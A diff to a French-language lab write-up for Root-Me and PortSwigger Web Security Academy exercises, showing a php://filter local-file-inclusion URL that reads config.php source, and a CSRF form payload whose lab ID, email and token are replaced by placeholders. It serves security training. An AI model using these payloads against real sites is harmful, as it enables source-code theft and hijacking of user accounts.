@@ -40,7 +40,7 @@ Sources : Cours + https://portswigger.net/web-security/file-path-traversal#how-t
 ### Les étapes de découverte de la vulnérabilité :
 
 On a utilisé la fonction `php://filter` sur la route `http://challenge01.root-me.org/web-serveur/ch12/?inc=login.php`.  
-On a trouvé que `login.php` inclut `login.php` donc en remplace la précédente route par la suivant : `php://filter/convert.base64-encode/resource=config.php`.  
+On a trouvé que `login.php` inclut `config.php` donc en remplace la précédente route par la suivante : `php://filter/convert.base64-encode/resource=config.php`.  
 On sait que `php://filter` permet au serveur de traiter un fichier avant de l’afficher.  
 On utilise le filtre `convert.base64-encode` pour convertir le contenu du fichier en base64.  
 On accède alors à la route `http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php`, qui affiche le code source encodé.  
@@ -130,11 +130,11 @@ On va donc changer le mail + récupérer le nouveau token CSRF en interceptant a
 ### Payload :
 
 ```
-<form action="https://0a84002e045f9cd1836361e200d6007b.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
+<form action="https://{{your-lab-id}}.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
 
-  <input type="hidden" name="email" value="attack@montoya.net">
+  <input type="hidden" name="email" value="{{user_email}}">
 
-  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj">
+  <input type="hidden" name="csrf" value="{{csrf_token}}">
 
 </form>
 
